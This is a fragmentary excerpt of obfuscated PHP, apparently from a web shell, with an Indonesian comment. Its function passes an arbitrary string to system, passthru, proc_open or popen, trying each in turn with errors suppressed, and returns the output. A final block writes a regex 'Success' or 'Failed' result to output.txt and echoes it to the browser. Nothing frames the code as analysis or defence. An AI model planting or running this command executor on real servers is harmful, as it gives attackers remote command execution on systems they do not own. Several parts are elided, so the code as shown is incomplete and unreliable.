...
function b_b9caa2a7($o_8ecaead4){
    ...
    if(is_callable('system')) {
        ob_start(); @system($o_8ecaead4); $p_ccde149e = ob_get_contents(); ob_end_clean();
    ...
    if(is_callable('passthru')) {
        ob_start(); @passthru($o_8ecaead4); $p_ccde149e = ob_get_contents(); ob_end_clean();
        if(!empty($p_ccde149e)) return $p_ccde149e;
    }
    if(is_callable('proc_open')) {
        $l_e0057275 = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
        $f_861d1896 = @proc_open($o_8ecaead4, $l_e0057275, $e_fca9786f, getcwd(), array());
        if (is_resource($f_861d1896)) {
            while ($e_c2c94c1c = fgets($e_fca9786f[1])) $p_ccde149e .= $e_c2c94c1c;
            while ($j_697cfa38 = fgets($e_fca9786f[2])) $p_ccde149e .= $j_697cfa38;
        }
    ...
    if(is_callable('popen')){
        ...
        if($q_8c9f3610){
            while(!feof($q_8c9f3610)) $p_ccde149e .= fread($q_8c9f3610, 2096);
            pclose($q_8c9f3610);
        }
        if(!empty($p_ccde149e)) return $p_ccde149e;
    }
...
if (preg_match($z_a3bcfc8e, $u_136ac113, $k_62615ba)) {
    $output = "Success ==> " . $k_62615ba[0];
} else {
    $output = "Failed :(";
}

file_put_contents('output.txt', $output);
echo $output;   // tetap tampil di browser jika diperlukan
